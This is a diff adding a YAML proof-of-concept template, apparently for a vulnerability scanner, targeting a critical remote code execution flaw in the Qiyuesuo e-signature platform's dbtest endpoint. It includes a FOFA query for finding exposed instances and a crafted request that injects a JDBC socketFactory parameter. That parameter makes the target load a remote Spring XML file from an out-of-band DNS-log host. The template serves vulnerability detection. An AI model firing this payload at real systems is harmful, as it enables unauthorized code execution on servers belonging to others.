@@ -1,0 +1,23 @@
+id: poc-yaml-qiyuesuo-dbtest-rce
+info:
+  name: 契约锁电子签章平台 dbtest 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 契约锁
+  fofa: app="契约锁-电子签署平台"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  paths: 'setup/dbtest
+
+    api/setup/dbtest
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{.domain}}%2F1%2Exml
+  expression: status_code == 200 && contains(body,"\"code\":100") && contains(content_type,"application/json")
+    && reverse.Verify()
+transport: http
